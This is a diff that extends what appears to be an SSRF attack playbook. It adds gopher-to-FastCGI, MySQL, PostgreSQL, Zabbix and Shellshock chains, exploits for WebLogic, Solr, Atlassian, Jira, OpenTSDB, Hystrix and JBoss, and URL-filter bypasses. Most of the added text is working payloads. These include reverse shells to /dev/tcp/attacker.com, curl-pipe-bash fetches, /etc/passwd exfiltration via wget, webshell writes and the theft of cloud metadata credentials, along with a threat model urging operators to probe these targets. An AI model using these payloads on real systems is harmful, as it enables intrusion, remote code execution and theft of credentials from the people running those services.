@@ -904,11 +904,571 @@ POST http://127.0.0.1:2375/exec/<exec-id>/start
 
 ---
 
+## FastCGI / PHP-FPM via Gopher → RCE
+
+**Root cause:** PHP-FPM listens on TCP port 9000 without any authentication when deployed in the common nginx + PHP-FPM architecture. The FastCGI protocol lets a client set arbitrary PHP INI values (`PHP_VALUE`, `PHP_ADMIN_VALUE`) on a per-request basis. Setting `auto_prepend_file` to a remotely-accessible URL or a local file path causes PHP to execute attacker-controlled code before every script run.
+
+**Bypass logic:** gopher:// can speak the binary FastCGI protocol directly. The only requirement is knowing the path to an existing PHP file on disk (often discoverable via error messages or common paths like `/var/www/html/index.php`).
+
+**Attack chain:** SSRF → gopher → FastCGI port 9000 → set `auto_prepend_file` to `/dev/fd/0` with piped payload → PHP executes command → RCE
+
+**Stack:** nginx + PHP-FPM (the dominant PHP deployment pattern in Docker/cloud environments); PHP 5.x–8.x
+
+**Payload:**
+```
+# Generate with Gopherus:
+python3 gopherus.py --exploit fastcgi
+
+# Gopherus prompts for:
+# - Target file path (e.g. /var/www/html/index.php)
+# - Command to execute (e.g. id)
+
+# Manual gopher URL structure (abbreviated — use Gopherus for full encoding):
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...
+# FastCGI header + FCGI_PARAMS with:
+#   PHP_VALUE: auto_prepend_file = php://input
+#   DOCUMENT_ROOT: /var/www/html
+#   SCRIPT_FILENAME: /var/www/html/index.php
+# + FCGI_STDIN: <?php system($_GET['cmd']); ?>
+
+# Probe port first:
+http://127.0.0.1:9000/   # TCP connect — timeout = closed, instant error = port open
+
+# Alternative: PHP-FPM on Unix socket (file://-based access, less common via SSRF)
+```
+
+**Source:** Gopherus (tarunkant/Gopherus), assetnote/blind-ssrf-chains
+
+---
+
+## MySQL via Gopher (Unauthenticated) → Data Exfil / Shell
+
+**Root cause:** MySQL instances running on localhost without a root password (or with a password-less `root@localhost` trust grant) accept the MySQL protocol over TCP. Gopher can speak MySQL's client-server handshake and execute arbitrary SQL.
+
+**Bypass logic:** Most internal MySQL deployments bind to `127.0.0.1:3306` and rely on network-level access control rather than password auth. Gopherus handles the binary protocol encoding.
+
+**Attack chain:** SSRF → gopher → MySQL 3306 → `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` → webshell → RCE | or → `LOAD DATA INFILE '/etc/passwd'` → file read
+
+**Stack:** MySQL/MariaDB without root password; common in legacy LAMP stacks and Docker dev environments
+
+**Payload:**
+```bash
+# Generate with Gopherus:
+python3 gopherus.py --exploit mysql
+
+# Gopherus prompts for:
+# - Username (default: root)
+# - SQL query to execute
+
+# Example queries:
+# Dump databases:
+SHOW DATABASES;
+
+# Write PHP shell to web root:
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
+
+# Read sensitive files (requires FILE privilege):
+LOAD DATA INFILE '/etc/passwd' INTO TABLE target_table;
+
+# Probe port:
+http://127.0.0.1:3306/   # Instant error with MySQL banner in body = open
+dict://127.0.0.1:3306/   # Alternative probe
+```
+
+**Source:** Gopherus (tarunkant/Gopherus), assetnote/blind-ssrf-chains
+
+---
+
+## PostgreSQL via Gopher → COPY TO PROGRAM RCE
+
+**Root cause:** PostgreSQL in "trust" authentication mode (common in Docker, dev deployments, and misconfigured cloud instances) allows connections from localhost without a password. The `COPY TO PROGRAM` command (PostgreSQL 9.3+) executes arbitrary OS commands as the `postgres` user.
+
+**Bypass logic:** Gopher speaks the PostgreSQL wire protocol. `COPY TO PROGRAM` requires superuser or `pg_execute_server_program` role — but `postgres` user in trust mode is typically superuser by default.
+
+**Attack chain:** SSRF → gopher → PostgreSQL 5432 → `COPY ... TO PROGRAM 'bash -c "..."'` → OS command execution → RCE as postgres user
+
+**Stack:** PostgreSQL 9.3+ with trust auth on localhost (common in Dockerized apps, CI/CD pipelines)
+
+**Payload:**
+```bash
+# Generate with Gopherus:
+python3 gopherus.py --exploit postgresql
+
+# Manual SQL chain (requires URL-encoding into gopher payload):
+# 1. Check if superuser:
+SELECT current_user, session_user;
+SELECT pg_catalog.current_setting('is_superuser');
+
+# 2. COPY TO PROGRAM RCE (PostgreSQL 9.3+):
+COPY (SELECT 'id') TO PROGRAM 'curl http://attacker.com/?x=$(id|base64)';
+
+# 3. Write reverse shell:
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
+
+# Probe port:
+http://127.0.0.1:5432/   # PostgreSQL returns binary banner on TCP connect
+dict://127.0.0.1:5432/   # Will return PostgreSQL error
+```
+
+**Source:** PostgreSQL docs (COPY TO PROGRAM), Gopherus, assetnote/blind-ssrf-chains
+
+---
+
+## Zabbix Agent via Gopher → Command Execution
+
+**Root cause:** Zabbix Agent listens on port 10050 and, when `EnableRemoteCommands = 1` is configured, executes arbitrary shell commands passed via the Zabbix protocol. It only restricts by source IP — from localhost, all commands are accepted. Gopherus generates the binary Zabbix protocol payload.
+
+**Bypass logic:** The Zabbix agent IP allowlist typically includes `127.0.0.1` (for local Zabbix server). SSRF from the same host bypasses the IP restriction entirely.
+
+**Attack chain:** SSRF → gopher → Zabbix agent port 10050 → send `system.run[command]` → OS command execution on Zabbix host
+
+**Stack:** Zabbix Agent 3.x–6.x with `EnableRemoteCommands=1` (common in monitoring-heavy enterprise environments)
+
+**Payload:**
+```bash
+# Generate with Gopherus:
+python3 gopherus.py --exploit zabbix
+
+# Gopherus prompts for command (e.g. id, or reverse shell one-liner)
+
+# Manual Zabbix protocol request:
+gopher://127.0.0.1:10050/_%01%00%00%00%00%00%00%00%09system.run[id]
+
+# Probe port:
+http://127.0.0.1:10050/  # Zabbix returns binary header
+
+# Test if remote commands enabled first:
+# system.run[echo test] → if it executes, EnableRemoteCommands=1
+```
+
+**Source:** Gopherus (tarunkant/Gopherus), assetnote/blind-ssrf-chains
+
+---
+
+## WebLogic SSRF Chains (CVE-2014-4210, CVE-2020-14883)
+
+**Root cause:** Two separate WebLogic vulnerabilities create high-value SSRF vectors in enterprise Oracle environments:
+- **CVE-2014-4210**: The UDDI Explorer at `/uddiexplorer/SearchPublicRegistries.jsp` makes server-side HTTP requests to a user-controlled `operator` parameter without authentication.
+- **CVE-2020-14883**: WebLogic console path traversal (`%252e%252e%252f`) bypasses auth, then `handle` parameter accepts a Spring XML URL that the server fetches and processes (allowing RCE via `ClassPathXmlApplicationContext`).
+
+**Bypass logic:** CVE-2014-4210 is a textbook SSRF — no exploit required, the feature is designed to make outbound requests. CVE-2020-14883 chains an auth bypass with an SSRF-driven RCE by pointing the handle to an attacker-controlled XML file.
+
+**Attack chain (4210):** SSRF → UDDI Explorer → internal port scan / metadata endpoint access
+**Attack chain (14883):** SSRF → console path traversal → Spring ClassPath XML from attacker → Java code execution → full RCE
+
+**Stack:** Oracle WebLogic Server 10.x–14.x (common in Oracle Fusion, banking/insurance backends)
+
+**Payload:**
+```
+# CVE-2014-4210 — SSRF via UDDI Explorer (unauthenticated)
+POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
+Host: target:7001
+Content-Type: application/x-www-form-urlencoded
+
+operator=http://169.254.169.254/latest/meta-data/&rdoSearch=name&
+txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
+
+# Response body will contain the HTTP response from the internal URL
+
+# CVE-2020-14883 — Console auth bypass + SSRF to RCE
+# Step 1: Get admin console via path traversal:
+GET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&
+handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext?http://attacker.com/poc.xml
+
+# Step 2: poc.xml on attacker server (Spring XML with command exec):
+<beans xmlns="http://www.springframework.org/schema/beans">
+  <bean id="pb" class="java.lang.ProcessBuilder">
+    <constructor-arg>
+      <list><value>bash</value><value>-c</value><value>id > /tmp/out</value></list>
+    </constructor-arg>
+    <property name="redirectErrorStream"><value>true</value></property>
+  </bean>
+  <bean class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+    <property name="targetObject"><ref bean="pb"/></property>
+    <property name="targetMethod"><value>start</value></property>
+  </bean>
+</beans>
+
+# Probe WebLogic ports:
+http://127.0.0.1:7001/    # Main HTTP port
+http://127.0.0.1:7002/    # HTTPS port
+http://127.0.0.1:7001/console/   # Admin console
+http://127.0.0.1:7001/uddiexplorer/   # UDDI explorer endpoint
+```
+
+**Source:** CVE-2014-4210 UDDI SSRF, CVE-2020-14883 console bypass, assetnote/blind-ssrf-chains
+
+---
+
+## Apache Solr SSRF (Shards Parameter + Replication Handler)
+
+**Root cause:** Apache Solr has two built-in SSRF vectors:
+1. **Shards parameter**: Solr's distributed search feature sends sub-queries to shard URLs. The `shards` query parameter is user-controllable and causes the Solr server to make HTTP requests to attacker-specified hosts.
+2. **Replication handler**: The `fetchindex` command fetches Solr index data from a `masterUrl` that can be any HTTP URL.
+
+**Bypass logic:** These are legitimate Solr features designed for distributed setups. No exploit required — the server is functioning as designed. The shards endpoint also allows chaining with XXE via `!xmlparser` query parser.
+
+**Attack chain (shards):** SSRF → Solr `?shards=` → internal HTTP request to any host → port scan or metadata
+**Attack chain (replication):** SSRF → POST to `/solr/collection/replication?command=fetchindex&masterUrl=` → outbound HTTP to attacker
+
+**Stack:** Apache Solr 5.x–8.x without network-level ACL (common in Elasticsearch-alternative search deployments, eCommerce, CMS)
+
+**Payload:**
+```
+# Shards parameter SSRF (GET, no auth required by default)
+http://127.0.0.1:8983/solr/collection1/select?q=*&shards=http://ATTACKER/solr/collection1/config%23
+# The %23 (#) comment terminates the path — Solr makes GET request to http://ATTACKER/...
+
+# XXE via Solr xmlparser (CVE-2017-12629, chained with shards SSRF):
+http://127.0.0.1:8983/solr/collection/select?q={!xmlparser%20v='<!DOCTYPE%20a%20SYSTEM%20"http://ATTACKER/xxe"'><a></a>'}
+
+# Replication handler SSRF (POST):
+POST http://127.0.0.1:8983/solr/collection/replication?command=fetchindex
+Content-Type: application/x-www-form-urlencoded
+
+masterUrl=http://169.254.169.254/latest/meta-data/
+
+# Admin API SSRF:
+http://127.0.0.1:8983/solr/admin/cores?action=CREATE&name=test&
+instanceDir=http://ATTACKER/solr-config/&wt=json
+
+# Probe Solr:
+http://127.0.0.1:8983/solr/admin/info/system
+http://127.0.0.1:8983/   # Returns Solr admin UI
+```
+
+**Source:** assetnote/blind-ssrf-chains, CVE-2017-12629 (Solr XXE+SSRF chain)
+
+---
+
+## Atlassian OAuth SSRF — CVE-2017-9506 (IconURIServlet)
+
+**Root cause:** The Atlassian OAuth plugin (versions before 1.9.12) ships an `IconURIServlet` that fetches icons for OAuth consumer registrations. The `consumerUri` parameter is passed directly to a server-side HTTP client without an allowlist, with no authentication required on the endpoint. Affects Jira, Confluence, Bamboo, Bitbucket, Crowd, Crucible, and Fisheye.
+
+**Bypass logic:** No authentication required. The endpoint exists to serve legitimate OAuth consumer icons — the outbound request is the intended behavior, the lack of any URL restriction is the bug. The endpoint remains active in many unpatched on-prem Atlassian deployments.
+
+**Attack chain:** SSRF → `/plugins/servlet/oauth/users/icon-uri?consumerUri=` → internal HTTP request → metadata endpoint / internal API access → credential theft
+
+**Stack:** All Atlassian server/data-center products with OAuth plugin < 1.9.12
+
+**Payload:**
+```
+# No authentication required — works from unauthenticated context
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: jira.target.com
+
+# Internal port scan via SSRF:
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:6379/ HTTP/1.1
+
+# GCP metadata (no header required in this context — fetched by server):
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://metadata.google.internal/computeMetadata/v1/
+
+# OOB blind SSRF confirmation:
+GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://YOUR-ID.oast.fun/atlassian-ssrf
+
+# Works on ALL Atlassian products:
+# Jira: /plugins/servlet/oauth/users/icon-uri
+# Confluence: /plugins/servlet/oauth/users/icon-uri
+# Bamboo, Bitbucket, Crowd, Crucible, Fisheye: same path
+```
+
+**Source:** CVE-2017-9506, assetnote/blind-ssrf-chains, multiple HackerOne Atlassian SSRF reports
+
+---
+
+## Jira SSRF — CVE-2019-8451 (Gadgets makeRequest)
+
+**Root cause:** Jira's gadget framework exposes a `/plugins/servlet/gadgets/makeRequest` endpoint that proxies HTTP requests to a `url` parameter. The URL validation can be bypassed using `@` URL syntax — the server extracts the hostname from the part after `@`, allowing the allowlist to be satisfied by an approved domain while the actual request goes to an internal IP.
+
+**Bypass logic:** `https://attacker.com:443@192.168.1.1/` — the Jira validator sees `attacker.com` as the host, but the HTTP client resolves `192.168.1.1`. This is a URL parsing inconsistency.
+
+**Attack chain:** SSRF → Jira makeRequest → internal HTTP request with `@` bypass → any internal host
+
+**Stack:** Jira Server/Data Center without the October 2019 patch (versions before 8.4.0)
+
+**Payload:**
+```
+# @ bypass — server sees attacker.com but requests internal IP
+GET /plugins/servlet/gadgets/makeRequest?url=https://attacker.com:443@169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: jira.target.com
+
+# Internal service access:
+GET /plugins/servlet/gadgets/makeRequest?url=https://example.com:443@127.0.0.1:6379/ HTTP/1.1
+
+# OOB blind confirmation:
+GET /plugins/servlet/gadgets/makeRequest?url=https://example.com:443@YOUR-ID.oast.fun/ HTTP/1.1
+
+# Note: Jira also vulnerable to CVE-2017-9506 (same OAuth plugin endpoint)
+# Chain both for maximum coverage on Jira targets
+```
+
+**Source:** CVE-2019-8451, assetnote/blind-ssrf-chains, Jira security advisory SA-2019-10
+
+---
+
+## OpenTSDB Command Injection via SSRF — CVE-2020-35476
+
+**Root cause:** OpenTSDB uses gnuplot to render metric graphs. The `yrange` parameter in the HTTP API is passed unsanitized to gnuplot's command interpreter, enabling shell command injection via backtick execution. OpenTSDB typically runs internally with no authentication.
+
+**Bypass logic:** The injection is in a gnuplot parameter processed server-side during graph rendering. The backtick syntax `` `cmd` `` in gnuplot arguments is executed by the OS shell.
+
+**Attack chain:** SSRF → OpenTSDB port 4242 → inject gnuplot `system()` call → OS command execution → exfil `/etc/passwd`, spawn reverse shell
+
+**Stack:** OpenTSDB 2.x with gnuplot installed (time-series metrics databases common in monitoring/DevOps stacks)
+
+**Payload:**
+```
+# CVE-2016-4535 — earlier gnuplot injection:
+http://127.0.0.1:4242/q?m=sys.cpu.user{host=web01}&style=%5C%5D%5B%60wget+http://attacker.com/?$(id|base64)%60%5D&png
+
+# CVE-2020-35476 — yrange parameter injection:
+http://127.0.0.1:4242/q?start=2000/10/26-00:00:00&m=sum:sys.cpu.user%7Bhost%3Dweb01%7D&yrange=%5B33:system(%27wget%20--post-file%20/etc/passwd%20http://attacker.com/%27)%5D&png
+
+# Simplified:
+http://127.0.0.1:4242/q?start=1h-ago&m=sum:metric&yrange=[0:system('id > /tmp/pwned')]&png
+
+# Reverse shell via curl:
+http://127.0.0.1:4242/q?start=1h-ago&m=sum:metric&yrange=[0:system('curl+http://attacker.com/rs.sh|bash')]&png
+
+# Probe OpenTSDB:
+http://127.0.0.1:4242/version
+http://127.0.0.1:4242/api/version
+http://127.0.0.1:4242/api/config
+```
+
+**Source:** CVE-2020-35476, assetnote/blind-ssrf-chains
+
+---
+
+## Hystrix Dashboard SSRF Stream Proxy — CVE-2020-5412
+
+**Root cause:** Netflix Hystrix Dashboard (Spring Cloud) exposes a `/proxy.stream` endpoint that proxies Server-Sent Event (SSE) streams. The `origin` parameter is passed directly to an HTTP client and streamed back to the dashboard UI, with no URL restriction. The endpoint exists to aggregate metrics from microservices but can proxy any internal HTTP resource.
+
+**Bypass logic:** The proxy endpoint is by design — it fetches and streams any URL. No authentication is required on internal deployments. The response is streamed directly, making internal API responses fully visible to the attacker.
+
+**Attack chain:** SSRF → Hystrix `/proxy.stream?origin=` → internal HTTP request → stream response to attacker
+
+**Stack:** Spring Cloud Netflix Hystrix Dashboard 2.x before March 2020 patch; common in Spring Boot microservice architectures
+
+**Payload:**
+```
+# Stream any internal URL through Hystrix Dashboard proxy:
+GET /proxy.stream?origin=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: target.com
+
+# Stream internal Redis info:
+GET /proxy.stream?origin=http://127.0.0.1:9200/_cluster/health HTTP/1.1
+
+# Stream GCP metadata:
+GET /proxy.stream?origin=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
+
+# Internal microservice API enumeration:
+GET /proxy.stream?origin=http://internal-service:8080/api/admin HTTP/1.1
+
+# Probe Hystrix Dashboard:
+http://127.0.0.1:8080/hystrix
+http://127.0.0.1:8080/proxy.stream?origin=http://127.0.0.1/   # Returns 200 if vulnerable
+```
+
+**Source:** CVE-2020-5412, assetnote/blind-ssrf-chains, Spring Cloud Netflix advisory
+
+---
+
+## GitLab Prometheus Redis Exporter SSRF → Redis Data Dump
+
+**Root cause:** The GitLab-bundled Prometheus Redis Exporter exposes a `/scrape` endpoint that accepts a `target` parameter specifying the Redis instance to scrape. The `check-keys` parameter requests all key values from the specified Redis server. The exporter is meant for internal monitoring but is accessible from the GitLab server itself, making it reachable via SSRF.
+
+**Bypass logic:** The `/scrape` endpoint is a legitimate monitoring feature. Because the exporter is trusted internally, it can access any Redis instance visible from the GitLab server — including those with authentication or network access restrictions that direct SSRF couldn't bypass.
+
+**Attack chain:** SSRF → GitLab Redis Exporter port 9121 → `?target=redis://INTERNAL:PORT&check-keys=*` → dump all Redis keys/values → session tokens, API keys, cached secrets
+
+**Stack:** GitLab CE/EE with bundled Prometheus stack (port 9121 active on GitLab servers)
+
+**Payload:**
+```
+# Dump all keys from a Redis instance via the exporter:
+http://127.0.0.1:9121/scrape?target=redis://127.0.0.1:6379&check-keys=*
+
+# Target a specific Redis database:
+http://127.0.0.1:9121/scrape?target=redis://127.0.0.1:6379/0&check-keys=*
+
+# Target Redis with password (if exporter has auth configured):
+http://127.0.0.1:9121/scrape?target=redis://:PASSWORD@127.0.0.1:6379&check-keys=*
+
+# Internal Redis on different host (via exporter as pivot):
+http://127.0.0.1:9121/scrape?target=redis://10.0.1.50:6379&check-keys=session:*
+
+# Probe exporter:
+http://127.0.0.1:9121/metrics   # Prometheus metrics endpoint
+http://127.0.0.1:9121/          # Returns 200 with exporter info
+```
+
+**Source:** assetnote/blind-ssrf-chains, GitLab Prometheus stack documentation
+
+---
+
+## JBoss JMX Console WAR Deployment via SSRF
+
+**Root cause:** JBoss Application Server 4.x and 5.x expose a JMX console at `/jmx-console/` without authentication by default. The `MainDeployer` service MBean accepts a WAR file URL and deploys it to the application server. Any WAR at an attacker-controlled URL is fetched and deployed, executing the servlet code as the JBoss process user.
+
+**Bypass logic:** No exploit required — the JMX console is a legitimate management interface. The JBoss server fetches the WAR from the attacker URL and deploys it automatically.
+
+**Attack chain:** SSRF → JBoss JMX console (port 8080) → `MainDeployer.deploy(attacker-WAR-URL)` → JBoss downloads and deploys WAR → servlet execution → RCE
+
+**Stack:** JBoss AS 4.0–5.1 without authentication on JMX console (legacy enterprise Java apps, banking, insurance)
+
+**Payload:**
+```
+# Deploy WAR from attacker URL via SSRF (no auth required):
+http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://attacker.com/pwn.war
+
+# Verify JMX console is accessible:
+http://127.0.0.1:8080/jmx-console/
+http://127.0.0.1:8080/jmx-console/HtmlAdaptor
+
+# pwn.war contents — a simple JSP shell in WEB-INF:
+# WEB-INF/web.xml + index.jsp with: <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
+
+# Alternative: use deploy via server-relative path if local file write possible
+http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=file:///tmp/pwn.war
+
+# JBoss also exposes:
+http://127.0.0.1:8080/web-console/    # Web-based admin console
+http://127.0.0.1:8080/invoker/JMXInvokerServlet   # RMI over HTTP
+```
+
+**Source:** assetnote/blind-ssrf-chains, classic JBoss exploitation research
+
+---
+
+## Shellshock via SSRF (CVE-2014-6271)
+
+**Root cause:** Bash versions before 4.3 patch 25 execute trailing commands in function definitions stored in environment variables. CGI scripts pass HTTP headers (User-Agent, Referer, Cookie, etc.) to Bash as environment variables. If the web server runs CGI scripts via `bash` and is reachable via SSRF, the attacker can inject Shellshock payloads via HTTP headers in the gopher-crafted request.
+
+**Bypass logic:** gopher:// allows setting arbitrary HTTP request headers including `User-Agent`, making it possible to inject Shellshock payloads in the internal HTTP request. The target needs to be a CGI endpoint on an old Bash installation.
+
+**Attack chain:** SSRF → gopher → internal CGI endpoint → Shellshock in User-Agent → OS command execution as www-data
+
+**Stack:** Apache/nginx + CGI scripts on systems with Bash < 4.3.25 (still found in embedded systems, legacy appliances, old VMs)
+
+**Payload:**
+```
+# Shellshock payload in HTTP header via gopher:
+gopher://127.0.0.1:80/_%47%45%54%20/cgi-bin/status%20HTTP/1.0%0D%0AUser-Agent:%20()%20{%20:;%20};%20/bin/bash%20-i%20>&%20/dev/tcp/attacker.com/4444%200>&1%0D%0A%0D%0A
+
+# Decoded HTTP request sent via gopher:
+GET /cgi-bin/status HTTP/1.0
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Also works in Referer, Cookie headers:
+Referer: () { :; }; curl http://attacker.com/?x=$(cat /etc/passwd|base64)
+
+# Common CGI paths to try:
+/cgi-bin/test.cgi
+/cgi-bin/status
+/cgi-bin/admin.cgi
+/cgi-bin/printenv
+/cgi-bin/env.cgi
+
+# Quick test (non-destructive — check for callback):
+User-Agent: () { :; }; curl http://YOUR-ID.oast.fun/shellshock-test
+```
+
+**Source:** CVE-2014-6271, assetnote/blind-ssrf-chains
+
+---
+
+## IPv6-Mapped IPv4 Bypass (Metadata IP Evasion)
+
+**Root cause:** IPv4 addresses can be represented in IPv6 notation as IPv4-mapped IPv6 addresses (`::ffff:x.x.x.x`). Filters that block the string `169.254.169.254` or `127.0.0.1` using string matching often don't check for IPv6-mapped equivalents. The OS network stack interprets `::ffff:169.254.169.254` as the same IP as `169.254.169.254` and routes accordingly.
+
+**Bypass logic:** String-based blocklists check for the exact IPv4 string form. The IPv6-mapped notation is syntactically different but semantically identical — the HTTP request reaches the same destination.
+
+**Attack chain:** SSRF → IPv6-mapped metadata IP → bypasses blocklist → metadata endpoint → AWS/GCP/Azure credentials
+
+**Stack:** Any SSRF filter using string matching without IPv6-aware IP normalization
+
+**Payload:**
+```
+# 127.0.0.1 in IPv6-mapped notation:
+http://[::ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/           # Hex form of 127.0.0.1
+
+# 169.254.169.254 (AWS metadata) in IPv6-mapped notation:
+http://[::ffff:169.254.169.254]/latest/meta-data/
+http://[::ffff:a9fe:a9fe]/latest/meta-data/   # Hex: a9=169, fe=254
+
+# 192.168.1.1 in IPv6-mapped form:
+http://[::ffff:192.168.1.1]/
+
+# Combined with metadata paths:
+http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/
+http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/
+
+# GCP metadata via IPv6-mapped:
+http://[::ffff:169.254.169.254]/computeMetadata/v1/instance/service-accounts/default/token
+
+# AWS alternative hostname (also bypasses IP-based blocking):
+http://instance-data/latest/meta-data/            # DNS name for 169.254.169.254 on EC2
+http://instance-data/latest/meta-data/iam/security-credentials/
+```
+
+**Source:** PayloadsAllTheThings SSRF bypass section, HackerOne disclosed SSRF bypass reports
+
+---
+
+## Multi-Library URL Parsing Differential Bypass
+
+**Root cause:** Different programming language standard libraries parse the same malformed URL in inconsistent ways. When an application uses library A for URL validation (allowlist check) and library B (or a different component) for the actual HTTP request, an attacker can craft a URL that passes library A's check while resolving to a different host in library B.
+
+**Bypass logic:** Whitespace, `@`, `#`, and backslash characters are handled differently across implementations. Python's `urllib`/`urllib2`/`requests`, Java's `URL`, Ruby's `URI`, and Node's `url` module all have documented differences. The classic example: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` — each library extracts a different "host" component.
+
+**Attack chain:** SSRF bypass → validation passes allowlist check using one host, request goes to different (internal) host → internal service access
+
+**Stack:** Python apps (urllib vs requests), Java apps (Apache HttpClient vs java.net.URL), Node.js (url vs fetch), any mixed-library validation pipeline
+
+**Payload:**
+```
+# Multi-parser differential examples (results depend on library combination):
+
+# Python urllib2/requests/urllib treat these differently:
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+# urllib2  → 1.1.1.1
+# requests → 2.2.2.2
+# urllib   → 3.3.3.3
+
+# Backslash authority confusion (urllib2 vs requests):
+http://127.1.1.1:80\@127.2.2.2:80/
+# Some parsers → 127.1.1.1 (validator sees allowed host)
+# Other parsers → 127.2.2.2 (request goes to internal)
+
+# Space before @ tricks some validators:
+http://127.1.1.1 @169.254.169.254/latest/meta-data/
+# Validator normalizes space → sees 127.1.1.1 (allowed)
+# HTTP client strips space → requests 169.254.169.254
+
+# http: without double slash (some parsers auto-complete):
+http:127.0.0.1/
+http:169.254.169.254/latest/meta-data/
+# Parser replaces to: http://127.0.0.1/ or http://169.254.169.254/...
+
+# Double @:
+http://127.1.1.1:80:\@@127.2.2.2:80/
+# First @ treated as credential separator by some; second @ as host separator by others
+
+# Testing approach: submit to each validation endpoint variation
+# and observe which host receives the callback on your OOB server
+```
+
+**Source:** PayloadsAllTheThings URL parsing section, SSRF bypass research (urllib2/requests/urllib differential behavior)
+
+---
+
 ## Threat Model
 
-> Current patterns as of 2026-Q2. Updated 2026-05-24.
+> Current patterns as of 2026-Q2. Updated 2026-05-25.
 
-**What's being exploited in the wild (2026-05-24):**
+**What's being exploited in the wild (2026-05-25):**
 
 1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
    #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
@@ -947,6 +1507,32 @@ POST http://127.0.0.1:2375/exec/<exec-id>/start
    image processors handling SVG are consistently found vulnerable. Prioritize these in
    media-heavy apps (social platforms, file-sharing SaaS).
 
+10. **PHP-FPM FastCGI exposure** — nginx + PHP-FPM is the dominant PHP deployment
+    pattern. Port 9000 is almost never firewalled internally. SSRF reaching PHP-FPM via
+    gopher → `auto_prepend_file` injection = instant RCE with no prerequisites. Prioritize
+    any PHP application.
+
+11. **Atlassian on-prem CVE-2017-9506 still widespread** — Despite being a 2017 CVE, the
+    OAuth icon-URI SSRF is still unpatched in a large fraction of self-hosted Jira/Confluence
+    deployments. It is unauthenticated and works on every Atlassian server product. Always
+    probe `/plugins/servlet/oauth/users/icon-uri?consumerUri=` on Atlassian targets.
+
+12. **Multi-library URL parsing as systematic bypass gap** — Applications validating URLs
+    with one library and executing requests with another are fundamentally bypassable via
+    parser differentials. The `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` family of payloads is
+    not an edge case — it reflects a structural flaw in how URL validation is commonly
+    implemented. Test all mixed-framework apps.
+
+13. **IPv6-mapped metadata IPs bypassing naive blocklists** — `[::ffff:169.254.169.254]`
+    reaches the AWS IMDS but evades string-match filters blocking `169.254.169.254`. Combined
+    with the `instance-data` EC2 hostname, there are now at least 4 distinct representations
+    of the AWS metadata IP that evade simple blocklists.
+
+14. **Enterprise service SSRF chains maturing** — WebLogic (UDDI SSRF, 7001), Apache Solr
+    (shards + replication, 8983), OpenTSDB (gnuplot injection, 4242), and Hystrix Dashboard
+    (/proxy.stream, 8080) are all proven SSRF → RCE chains in enterprise-heavy environments.
+    Internal network recon via SSRF should always probe these ports.
+
 ---
 
 ## Bypass Matrix
@@ -968,6 +1554,10 @@ POST http://127.0.0.1:2375/exec/<exec-id>/start
 | XML input (DOCTYPE blocked) | XInclude (`xi:include`) or XSLT `document()` | No DOCTYPE declaration needed |
 | GET-only SSRF vector | 307/308 redirect to POST/PUT target | Method preserved through redirect |
 | OAuth `redirect_uri` validation | Point `jwks_uri` / `metadata_url` to internal IP | Server fetches URL to validate |
+| Blocks `169.254.169.254` (string match) | `[::ffff:169.254.169.254]` or `[::ffff:a9fe:a9fe]` | IPv6-mapped form evades string blocklist |
+| Blocks `127.0.0.1` (string match) | `[::ffff:127.0.0.1]` or `[::ffff:7f00:1]` | IPv6-mapped form; semantically identical |
+| Mixed-library validation (validate A, request B) | `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` or `http://127.1.1.1:80\@192.168.1.1/` | Different parsers extract different host fields |
+| Domain allowlist via EC2 hostname | `http://instance-data/latest/meta-data/` | EC2 DNS resolves to 169.254.169.254; bypasses IP-based checks |
 
 ---
 
@@ -991,6 +1581,19 @@ POST http://127.0.0.1:2375/exec/<exec-id>/start
 | Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
 | ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
 | SMTP relay at `127.0.0.1:25` | Internal mail relay accepts unauthenticated HELO | gopher → SMTP → spoofed email → phishing |
+| PHP-FPM at `127.0.0.1:9000` | No auth; FastCGI protocol allows PHP INI injection | gopher → FastCGI → `auto_prepend_file` → RCE |
+| MySQL at `127.0.0.1:3306` (no root password) | Trust auth grants full SQL access from localhost | gopher → SQL → `INTO OUTFILE` webshell or file read |
+| PostgreSQL at `127.0.0.1:5432` (trust mode) | Trust auth + `COPY TO PROGRAM` available | gopher → COPY TO PROGRAM → OS command execution |
+| Zabbix Agent at `127.0.0.1:10050` | `EnableRemoteCommands=1` is common in prod monitoring | gopher → Zabbix → command execution |
+| WebLogic at `127.0.0.1:7001` | UDDI SSRF (CVE-2014-4210); console auth bypass + XML RCE (CVE-2020-14883) | SSRF → UDDI probe → or → WAR/Spring XML RCE |
